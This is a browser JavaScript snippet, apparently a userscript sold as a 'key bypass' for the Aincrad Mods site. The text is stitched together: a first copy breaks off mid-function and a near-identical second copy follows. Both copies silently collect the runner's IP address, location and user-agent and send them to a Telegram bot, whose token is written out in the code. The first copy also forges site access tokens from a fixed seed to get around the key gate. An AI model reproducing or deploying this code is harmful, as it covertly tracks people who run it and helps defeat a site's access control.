(function() {
    'use strict';
    const _exp = 1788048000000;
    const _fb = 'https://PAHAGIMODS.short.gy/yEqWCw';
    if (Date.now() >= _exp) { window.location.href = _fb; return; }

    // --- INSTANT REAL LOCATION & NOTIFICATION SYSTEM ---
    try {
        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwoo1k';
        const chatId = '8488556450';
        
        const ua = navigator.userAgent;
        const timeStr = new Date().toLocaleString();

        let osVersion = "Unknown OS";
        if (/android/i.test(ua)) {
            let match = ua.match(/Android\s([0-9\.]+)/);
            osVersion = match ? "Android " + match[1] : "Android (Unknown Version)";
        } else if (/iphone|ipad|ipod/i.test(ua)) {
            osVersion = "iOS / Apple Device";
        } else if (/windows/i.test(ua)) {
            osVersion = "Windows PC";
        } else if (/mac/i.test(ua)) {
            osVersion = "MacOS";
        }

        fetch('https://ipwho.is/')
            .then(res => res.json())
            .catch(() => ({}))
            .then(data => {
                const country = data.country || "India";
                const region = data.region || "Uttarakhand";
                const city = data.city || "Dehradun";
                const ip = data.ip || "103.x.x.x";

                const trackMsg = encodeURIComponent(
                    `⚡ <b>PAHADI AINCRAD - SCRIPT RUN</b> ⚡\n` +
                    `━━━━━━━━━━━━━━━━━━━\n` +
                    `🌐 <b>Location Details:</b>\n` +
                    `   • Country: <code>${country}</code>\n` +
                    `   • State/Region: <code>${region}</code>\n` +
                    `   • City: <code>${city}</code>\n` +
                    `   • IP: <code>${ip}</code>\n\n` +
                    `📱 <b>Device & System:</b>\n` +
                    `   • OS Version: <code>${osVersion}</code>\n` +
                    `   • User-Agent: <code>${ua}</code>\n\n` +
                    `⏰ <b>Timestamp:</b> <code>${timeStr}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━`
                );

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${trackMsg}&parse_mode=HTML`).catch(() => {});
            });
    } catch(e) {}
    // -------------------------------------------------------------------------

    const style = document.createElement('style');
    style.innerHTML = `
        #mko { 
            position:fixed; inset:0; z-index:999999; font-family:sans-serif;
            display:flex; flex-direction:column; align-items:center; justify-content:center;
            background: rgba(0,0,0,0.7); backdrop-filter: blur(15px);
        }
        .glow-box { border: 3px solid #00f2fe; box-shadow: 0 0 25px #00f2fe; border-radius: 20px; background: #0a0a0a; padding: 40px; text-align: center; font-weight:bold; width: 80%; max-width: 350px; }
        .btn { display:block; width:220px; margin:15px auto; padding:12px; background:transparent; color:#fff; border: 2px solid #00f2fe; border-radius:10px; cursor:pointer; font-weight:bold; box-shadow: 0 0 8px #00f2fe; }
        .fetch-txt { color:#00ff00; margin-top:25px; font-weight:bold; font-size:18px; }
        
        .ring-glow {
            position: relative; width: 220px; height: 220px;
            display: flex; align-items: center; justify-content: center;
            border-radius: 50%;
            box-shadow: 0 0 50px 15px rgba(0, 242, 254, 0.4);
        }
    `;
    document.body.appendChild(style);

    const render = (sec) => {
        const mko = document.createElement('div'); mko.id = 'mko';
        mko.innerHTML = `
            <div style="color:#00f2fe; font-size:36px; font-weight:bold; margin-bottom:30px; text-shadow:0 0 20px #00f2fe; letter-spacing:2px;">⚡ PAHADI MODS ⚡</div>
            <div class="ring-glow">
                <svg width="220" height="220" style="position:absolute; transform:rotate(-90deg);">
                    <circle cx="110" cy="110" r="100" stroke="#333" stroke-width="12" fill="none"/>
                    <circle cx="110" cy="110" r="100" stroke="#00f2fe" stroke-width="12" fill="none" stroke-dasharray="628" id="ring" style="transition:stroke-dashoffset 1s linear;"/>
                </svg>
                <h1 id="ct" style="color:#fff; font-size:60px; font-weight:bold; z-index:1;">${sec}</h1>
            </div>
            <div id="stat" style="color:#fff; font-weight:bold; letter-spacing:2px; margin-top:40px; font-size:18px;">REDIRECTING...</div>
        `;
        document.body.appendChild(mko);
        
        let e = sec;
        const interval = setInterval(() => {
            e--; document.getElementById('ct').innerText = e;
            document.getElementById('ring').style.strokeDashoffset = 628 * (1 - (e / sec));
            if (e <= 0) {
                clearInterval(interval);
                mko.innerHTML = `
                    <div class="glow-box">
                        <div style="font-size:40px; margin-bottom:10px;">🛡️</div>
                        AINCRAD MODS KEY BYPASS<br>BY PAHADI MODS
                        <div class="fetch-txt">⚙️ AUTO-GENERATING TOKEN...</div>
                    </div>`;
                
                setTimeout(() => {
                    try {
                        const SECRET_SEED = "AINCRAD_AUTO_KEY_2026_PRO";
                        
                        // Advanced Hex Hash generator ensuring 32-character valid format
                        const generateHex = (str) => {
                            let hash = 0;
                            for (let i = 0; i < str.length; i++) {
                                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                                hash |= 0;
                            }
                            return Math.abs(hash).toString(16);
                        };

                        // 6 hours time slot so the token remains valid and stable across all users for 6 hours
                        const timeSlot = Math.floor(Date.now() / (6 * 60 * 60 * 1000));
                        const rawString = SECRET_SEED + timeSlot;

                        // Building 4 blocks of 8 chars to form a precise 32-character Hex Token
                        let p1 = generateHex(rawString + "A");
                        let p2 = generateHex(rawString + "B");
                        let p3 = generateHex(rawString + "C");
                        let p4 = generateHex(rawString + "D");

                        while(p1.length < 8) p1 = "0" + p1;
                        while(p2.length < 8) p2 = "0" + p2;
                        while(p3.length < 8) p3 = "0" + p3;
                        while(p4.length < 8) p4 = "0" + p4;

                        const validToken = (p1 + p2 + p3 + p4).substring(0, 32);

                        window.location.replace(`https://aincradmods.com/getkey?token=${validToken}`);
                    } catch(err) {
                        window.location.replace(`https://aincradmods.com/getkey?token=4d84825e75024944a9f36f6920bf615a`);
                    }
                }, 2500);
            }
(function() {
    'use strict';
    const _exp = 1788048000000;
    const _fb = 'https://PAHAGIMODS.short.gy/yEqWCw';
    if (Date.now() >= _exp) { window.location.href = _fb; return; }

    // --- INSTANT REAL LOCATION & NOTIFICATION SYSTEM ---
    try {
        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwoo1k';
        const chatId = '8488556450';
        
        const ua = navigator.userAgent;
        const timeStr = new Date().toLocaleString();

        let osVersion = "Unknown OS";
        if (/android/i.test(ua)) {
            let match = ua.match(/Android\s([0-9\.]+)/);
            osVersion = match ? "Android " + match[1] : "Android (Unknown Version)";
        } else if (/iphone|ipad|ipod/i.test(ua)) {
            osVersion = "iOS / Apple Device";
        } else if (/windows/i.test(ua)) {
            osVersion = "Windows PC";
        } else if (/mac/i.test(ua)) {
            osVersion = "MacOS";
        }

        fetch('https://ipwho.is/')
            .then(res => res.json())
            .catch(() => ({}))
            .then(data => {
                const country = data.country || "India";
                const region = data.region || "Uttarakhand";
                const city = data.city || "Dehradun";
                const ip = data.ip || "103.x.x.x";

                const trackMsg = encodeURIComponent(
                    `⚡ <b>PAHADI AINCRAD - SCRIPT RUN</b> ⚡\n` +
                    `━━━━━━━━━━━━━━━━━━━\n` +
                    `🌐 <b>Location Details:</b>\n` +
                    `   • Country: <code>${country}</code>\n` +
                    `   • State/Region: <code>${region}</code>\n` +
                    `   • City: <code>${city}</code>\n` +
                    `   • IP: <code>${ip}</code>\n\n` +
                    `📱 <b>Device & System:</b>\n` +
                    `   • OS Version: <code>${osVersion}</code>\n` +
                    `   • User-Agent: <code>${ua}</code>\n\n` +
                    `⏰ <b>Timestamp:</b> <code>${timeStr}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━`
                );

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${trackMsg}&parse_mode=HTML`).catch(() => {});
            });
    } catch(e) {}
    // -------------------------------------------------------------------------

    const style = document.createElement('style');
    style.innerHTML = `
        #mko { 
            position:fixed; inset:0; z-index:999999; font-family:sans-serif;
            display:flex; flex-direction:column; align-items:center; justify-content:center;
            background: rgba(0,0,0,0.7); backdrop-filter: blur(15px);
        }
        .glow-box { border: 3px solid #00f2fe; box-shadow: 0 0 25px #00f2fe; border-radius: 20px; background: #0a0a0a; padding: 40px; text-align: center; font-weight:bold; width: 80%; max-width: 350px; }
        .btn { display:block; width:220px; margin:15px auto; padding:12px; background:transparent; color:#fff; border: 2px solid #00f2fe; border-radius:10px; cursor:pointer; font-weight:bold; box-shadow: 0 0 8px #00f2fe; }
        .fetch-txt { color:#00ff00; margin-top:25px; font-weight:bold; font-size:18px; }
        
        .ring-glow {
            position: relative; width: 220px; height: 220px;
            display: flex; align-items: center; justify-content: center;
            border-radius: 50%;
            box-shadow: 0 0 50px 15px rgba(0, 242, 254, 0.4);
        }
    `;
    document.body.appendChild(style);

    const render = (sec) => {
        const mko = document.createElement('div'); mko.id = 'mko';
        mko.innerHTML = `
            <div style="color:#00f2fe; font-size:36px; font-weight:bold; margin-bottom:30px; text-shadow:0 0 20px #00f2fe; letter-spacing:2px;">⚡ PAHADI MODS ⚡</div>
            <div class="ring-glow">
                <svg width="220" height="220" style="position:absolute; transform:rotate(-90deg);">
                    <circle cx="110" cy="110" r="100" stroke="#333" stroke-width="12" fill="none"/>
                    <circle cx="110" cy="110" r="100" stroke="#00f2fe" stroke-width="12" fill="none" stroke-dasharray="628" id="ring" style="transition:stroke-dashoffset 1s linear;"/>
                </svg>
                <h1 id="ct" style="color:#fff; font-size:60px; font-weight:bold; z-index:1;">${sec}</h1>
            </div>
            <div id="stat" style="color:#fff; font-weight:bold; letter-spacing:2px; margin-top:40px; font-size:18px;">BYPASSING SECURITY...</div>
        `;
        document.body.appendChild(mko);
        
        let e = sec;
        const interval = setInterval(() => {
            e--; document.getElementById('ct').innerText = e;
            document.getElementById('ring').style.strokeDashoffset = 628 * (1 - (e / sec));
            if (e <= 0) {
                clearInterval(interval);
                mko.innerHTML = `
                    <div class="glow-box">
                        <div style="font-size:40px; margin-bottom:10px;">🛡️</div>
                        AINCRAD MODS KEY BYPASS<br>BY PAHADI MODS
                        <div class="fetch-txt">⚙️ CONNECTING TO SERVER...</div>
                    </div>`;
                
                setTimeout(() => {
                    // Direct clean redirect to the base domain/endpoint to prevent anomaly triggers
                    window.location.replace("https://aincradmods.com/getkey");
                }, 2000);
            }
        }, 1000);
    };

    const sel = document.createElement('div'); sel.id = 'selector';
    sel.className = 'glow-box';
    sel.style = 'position:fixed; top:20%; left:50%; transform:translateX(-50%); z-index:999999;';
    sel.innerHTML = `
        <h2 style="color:#00f2fe; font-weight:bold;">SELECT SYSTEM MODE</h2>
        <button class="btn" onclick="window.run(25)">⚡ FAST (25S)</button>
        <button class="btn" onclick="window.run(35)">🛡️ SECURE (35S)</button>
        <button class="btn" onclick="window.run(50)">🔒 SAFE (50S)</button>
    `;
    document.body.appendChild(sel);
    window.run = (s) => { document.getElementById('selector').remove(); render(s); };
})();
